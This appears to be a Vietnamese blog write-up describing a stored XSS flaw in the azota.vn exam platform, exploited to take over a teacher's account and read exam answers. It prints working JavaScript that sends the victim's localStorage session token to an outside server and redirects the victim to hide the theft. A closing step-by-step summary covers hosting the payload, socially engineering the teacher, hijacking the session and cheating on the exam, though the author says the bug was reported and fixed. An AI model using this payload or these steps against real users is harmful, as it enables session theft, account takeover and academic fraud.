# Tôi đã hack đáp án azota như nào trong kỳ thi như thế nào
-------------------------------------------
## [Đến phần khai thác luôn thì ấn vào đây](#Tóm-tắt-khai-thác)

## - Mở bài
Thật ra cũng thật tình cờ vào một ngày đẹp thức dậy vào lúc 7h đánh răng ngồi vào bàn học mở zoom thân thương lên để học tập trong mùa dịch, một thông báo bất ngờ hiện lên với dòng tin nhắn của thầy tôi là **KIỂM TRA HOÁ GIỮA KỲ** vào tuần sau trên azota, tôi thật bất ngờ nhưng cũng thật bình tĩnh....
Sau 5 tiết học bận rội tôi mở chiếc lattop cũ kỹ của tôi lên vào web azota để lập tài khoản và thi thử. Tôi biết mình là một người học không tốt môn hoá mấy(thật ra mất gốc). Từ đó tôi suy nghĩ có cách nào mà làm cái khác mà vẫn có ăn không.

## - Thân bài 
Sau khi dạo quanh một vòng web thì tôi tìm ra một số api bị dính lỗi.
Địa chỉ bị lỗi là phần chỉnh sửa web site của azota:
![anh_chinh_sua_web](https://raw.githubusercontent.com/VHAE04/Report_web_security_vulnerabilities/main/T%C3%B4i%20%C4%91%C3%A3%20hack%20%C4%91%C3%A1p%20%C3%A1n%20azota%20nh%C6%B0%20n%C3%A0o/images/1sua_web.PNG)

### Các api thú vị:
#### Api - 1
`PUT /ladipage/m11_2021/d02/1787477/6181ab4aXXXXXXXXXXX`
`Host: wewiin.nyc3.digitaloceanspaces.com`
![post_chinhsua_web](https://github.com/VHAE04/Report_web_security_vulnerabilities/blob/main/T%C3%B4i%20%C4%91%C3%A3%20hack%20%C4%91%C3%A1p%20%C3%A1n%20azota%20nh%C6%B0%20n%C3%A0o/images/2post_chinhsua_web.PNG?raw=true)


Đây là một api post dữ liệu web của mình lên `CND` trung gian của `digitaloceanspaces`.

Theo chúng ta thấy dữ liệu post ở đây không bị mã hoá và nó là html.

Mình đã thử chèn một đoạn thẻ `<script>alert(1)</script>` post lên .

Và thật bất ngờ ngay sau khi mình truy cập trang web của mình thì web đã bị xss.

Khoan dừng khoảng chừng là 2 giây ở đây mình đã xss trang `CDN` chứ không phải trang `azota.vn`(đọc sang api thứ 2 thì hiểu nhé).

Mình nhẹ nhàng check lại bằng cách thay `alert(1)` =>  `alert(document.URL)`

**Và :**

![alert_url](https://github.com/VHAE04/Report_web_security_vulnerabilities/blob/main/T%C3%B4i%20%C4%91%C3%A3%20hack%20%C4%91%C3%A1p%20%C3%A1n%20azota%20nh%C6%B0%20n%C3%A0o/images/alert_url.PNG?raw=true)


Thật bất ngờ khi alert hiện lên là url azota đến đây thì mình đã hiểu là web đã render dữ liệu *HTML* từ `CDN` vào thẳng trang web chứ không chèn thông qua `iframe`.
Từ đây web đã bị dính `Stored XSS`

#### Api thứ 2
`POST /api/Usersetting/SaveMyDomain HTTP/2`
`Host: azota.vn`
![post_url_render](https://github.com/VHAE04/Report_web_security_vulnerabilities/blob/main/T%C3%B4i%20%C4%91%C3%A3%20hack%20%C4%91%C3%A1p%20%C3%A1n%20azota%20nh%C6%B0%20n%C3%A0o/images/3post_url_render.PNG?raw=true)


Vậy ra đây một api post `url` web của bạn lên để khi truy cập web site của bạn thì **web sẽ render html** từ trang web này @@.

Nếu vậy có nghĩa là mình chèn một [URL](https://raw.githubusercontent.com/VHAE04/Report_web_security_vulnerabilities/main/T%C3%B4i%20%C4%91%C3%A3%20hack%20%C4%91%C3%A1p%20%C3%A1n%20azota%20nh%C6%B0%20n%C3%A0o/xss.html) bị tiêm mã script thì khi web azota render html từ trang đó thì cũng bị `XSS`.



### Tóm lại web đã bị xss nhưng làm sao hack được đáp án
Ở đây nếu muốn lấy đáp án thì phải truy cập vào tài khoản của thầy giáo qua `cookie`(document.cookie) nhưng nếu cookie `httponly` hoặc được `secure` thì chắc cũng bó tay **nhưng ở đây là lúc mình nhận ra** web họ không xác thực qua cookie mà qua `localStorage` **@@ khó hiểu** nếu vậy mình chỉ cần đánh cắp `localStorage` của thầy là mình đã có thể truy cập vào ních thầy được rồi.

code xss 
```
<script>
// post data localStorage lên server của mình 
var xhttp = new XMLHttpRequest();
xhttp.open("POST", "https://webcuaban.com", true);
xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
xhttp.send("data=".concat(localStorage.getItem("user_obj")));
//chuyển hướng đánh lừa thầy web lỗi 404
window.location=("https://azota.vn/vi/admin/baithi");
</script>
```
Giờ thì `social engineering` thôi :3 
![anh_social](https://github.com/VHAE04/Report_web_security_vulnerabilities/blob/main/T%C3%B4i%20%C4%91%C3%A3%20hack%20%C4%91%C3%A1p%20%C3%A1n%20azota%20nh%C6%B0%20n%C3%A0o/images/social.PNG?raw=true)

Ngay sau đó mình đã có data đăng nhập của thầy:

![anh_data](https://github.com/VHAE04/Report_web_security_vulnerabilities/blob/main/T%C3%B4i%20%C4%91%C3%A3%20hack%20%C4%91%C3%A1p%20%C3%A1n%20azota%20nh%C6%B0%20n%C3%A0o/images/data.PNG?raw=true)

:)) đến giờ thì vào thay `localStorage` của thầy và khui đáp án thi học kỳ lấy 10đ thôi.

## - Kết bài
Mình chỉ demo vui vậy thôi chứ mình đã report cho bên đơn vị liên quan để họ sửa chữa

![anh_suachua](https://github.com/VHAE04/Report_web_security_vulnerabilities/blob/main/T%C3%B4i%20%C4%91%C3%A3%20hack%20%C4%91%C3%A1p%20%C3%A1n%20azota%20nh%C6%B0%20n%C3%A0o/images/fix.PNG?raw=true).


# Tóm tắt khai thác 
- 1 Tạo câu lệnh js lấy `localStorage`
    ```
    <script>
    // post data localStorage lên server của mình 
    var xhttp = new XMLHttpRequest();
    xhttp.open("POST", "https://webcuaban.com", true);
    xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    xhttp.send("data=".concat(localStorage.getItem("user_obj")));
    //chuyển hướng đánh lừa thầy web lỗi 404
    window.location=("https://azota.vn/vi/admin/baithi");
    </script>
    ```
    Lưu ý vào **https://webcuaban.com** là web của các bạn chèn vào để lấy thông tin post lên ở đây mình khuyến khích các bạn tạo một api get request free ở đây [https://requestbin.com/](https://requestbin.com/)
- 2 Up code lên web nào đó khuyến khích [pastebin](https://pastebin.com/) or [github](https://github.com/VHAE04) ....
  Demo [https://pastebin.com/raw/yS3NZUMr](https://pastebin.com/raw/yS3NZUMr)
- 3 Post url đã được tiêm lệnh lên **[api sau](#Api-thứ-2)**
- 4 Bảo người dùng vào đường dẫn bằng `social engineering`
- 5 Lên web lấy thông tin khi nạn nhân đã post và thay vào `localStorage` của mình
- 6 Truy cập vào tài khoản qua `localStorage` và lấy đáp án thôi :3 **chúc bạn thi thật tốt**
